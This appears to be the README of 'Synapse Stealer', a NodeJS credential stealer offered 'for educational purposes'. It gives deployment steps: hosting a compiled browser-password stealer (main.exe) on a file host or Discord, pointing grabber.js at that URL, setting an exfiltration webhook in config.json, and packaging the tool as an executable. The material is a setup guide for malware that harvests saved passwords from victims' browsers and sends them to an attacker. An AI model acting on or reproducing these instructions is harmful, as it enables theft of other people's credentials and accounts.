# Synapse Stealer

Advanced **datastealer** coded in NodeJS for educational purposes.

## Prerequisites

* [Node.js](https://nodejs.org/)

## Setup

**Uploading main.exe:** 
Main.exe is a compiled browser passwords stealer, it will save all passwords in a txt file.
We're using it since NodeJS isn't able yet to decrypt chromium passowrds.
Upload it in a file hosting website (or even send it to discord to someone and copy the url) and change the url in grabber.js line 143.

Installing:
```bash
npm install
npm i pkg
```
Compiling to exe:
```bash
pkg config.json
```

In order to modify the webhook, change it in config.json file
